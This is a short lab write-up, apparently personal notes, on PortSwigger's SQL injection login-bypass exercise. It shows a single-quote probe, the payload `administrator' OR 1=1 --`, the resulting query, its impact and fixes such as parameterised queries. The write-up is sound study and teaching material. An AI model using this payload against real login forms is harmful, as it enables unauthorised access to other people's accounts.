# SQL Injection – Authentication Bypass

## 📌 Lab

PortSwigger: *SQL injection vulnerability allowing login bypass*

---

## 📌 Overview

This lab contains a SQL Injection vulnerability in the login functionality.

The goal is to bypass authentication and log in as the `administrator` user.

---

## 🔍 Injection Point

The injection point is the `username` field in the login form.

---

## 🧪 Testing

I attempted to inject a single quote in the username field:

```
'
```

This caused an error, indicating a possible SQL Injection vulnerability.

---

## 💣 Exploit

Payload used:

```
administrator' OR 1=1 --
```

---

## 🧠 Explanation

The application likely executes a query like:

```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'password';
```

After injection:

```sql
SELECT * FROM users WHERE username = 'administrator' OR 1=1 -- ' AND password = 'password';
```

The condition `OR 1=1` is always true, so the query returns a valid user.

This allows authentication bypass without knowing the password.

---

## 🎯 Impact

* Authentication bypass
* Unauthorized access to privileged accounts

---

## 🛠️ Fix

* Use prepared statements (parameterized queries)
* Avoid concatenating user input into SQL queries
* Validate user input

---

## 🧠 Notes

This is a classic example of SQL Injection leading to authentication bypass.
